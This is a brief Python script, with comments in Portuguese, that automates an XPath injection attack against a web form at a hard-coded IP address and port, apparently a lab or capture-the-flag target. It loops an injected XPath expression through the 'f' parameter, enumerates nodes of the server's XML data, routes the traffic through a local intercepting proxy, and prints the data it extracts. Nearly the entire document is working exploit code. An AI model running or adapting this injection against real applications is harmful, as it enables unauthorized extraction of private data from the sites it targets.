import requests
from rich import print #Cores no print
import sys
from bs4 import BeautifulSoup #Parsing de HTML
# GET Request

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = "http://94.237.63.49:44692/index.php"

for x in range(1, 4):
	valor = f"fullstreetname | /*[1]/*[2]/*[3]/*[1]/*[{x}]" # Loop pra mudar o valor de X
	data = {
	 # 'q': sys.argv[1], Caso queira usar argumentos
	 'q': "SOMETHINGINVALID", 
	 'f': valor
	}
	response = requests.get(url, params=data, headers=headers, proxies=proxies)
	html_response = response.text # Salva a response em uma variável
	soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
	results_tag = soup.find_all("center") # Filtra pela tag HTML "center"
	print(f"[bold yellow]Test with {valor}[/bold yellow]") # Printa o valor utilizado no loop
	print(results_tag[1]) # Printa somente o valor da segunda tag "center"
	